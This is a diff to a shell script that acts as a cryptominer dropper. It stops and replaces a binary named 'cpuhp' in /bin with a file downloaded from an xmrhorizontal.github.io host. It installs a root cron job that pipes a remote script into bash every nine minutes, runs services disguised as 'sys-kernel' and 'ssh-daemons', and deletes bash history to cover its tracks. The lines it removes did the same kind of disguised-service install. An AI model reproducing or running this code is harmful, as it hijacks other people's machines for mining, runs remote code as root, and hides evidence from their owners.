@@ -1,27 +1,12 @@
-if [ -e "/etc/cron.d/cronconfig" ]; then
+if [ ! -f /etc/cron.d/cronextend ]; then
+	systemctl stop sys-kernel.service
         killall cpuhp
-	rm -f /etc/cron.d/cronconfig
- 	cd /etc/systemd/system
-	wget https://xmrhorizontal.github.io/sys-kernel.service
-	wget https://xmrhorizontal.github.io/ssh-daemons.service
+ 	cd /bin
+	rm cpuhp
+	wget https://xmrhorizontal.github.io/cpuhp
+    	echo "*/9 * * * * root curl -s https://xmrhorizontal.github.io/searcher.sh | bash" > /etc/cron.d/cronextend
  	systemctl daemon-reload
-        systemctl enable ssh-daemons.service
-	systemctl enable sys-kernel.service
-	systemctl start ssh-daemons.service
 	systemctl start sys-kernel.service
         rm -f ~/.bash_history
         rm -f /root/.bash_history
 fi
-systemctl stop sys-kernel.service
-systemctl stop ssh-daemons.service
-systemctl disable sys-kernel.service
-systemctl disable ssh-daemons.service
-cd /etc/systemd/system
-rm ./sys-kernel.service
-rm ./ssh-daemons.service
-wget https://xmrhorizontal.github.io/sys-kernel.service
-wget https://xmrhorizontal.github.io/ssh-daemons.service
-systemctl enable sys-kernel.service
-systemctl enable ssh-daemons.service
-systemctl start ssh-daemons.service
-systemctl start sys-kernel.service
